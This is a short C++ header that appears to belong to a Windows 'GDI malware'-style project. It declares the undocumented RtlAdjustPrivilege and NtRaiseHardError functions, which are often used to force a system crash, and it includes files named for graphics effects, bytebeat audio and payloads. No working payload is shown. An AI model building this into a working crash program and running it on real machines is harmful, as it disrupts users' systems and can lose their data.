// OPTIONS //
#pragma once
#pragma warning(disable: 4095)

// MAIN LIBRARIES //
#include <Windows.h>
#include <Math.h>
#include <Time.h>

// DEFINES //
extern "C" {
	DWORD WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, BYTE*);
	DWORD WINAPI NtRaiseHardError(DWORD, DWORD, DWORD, DWORD**, DWORD, DWORD*);
}
typedef struct IUnknown IUnknown;

// LOCAL LIBRARIES //
#include "GDI_FX.h"
#include "BYTEBEAT.h"
#include "PAYLOADS.h"
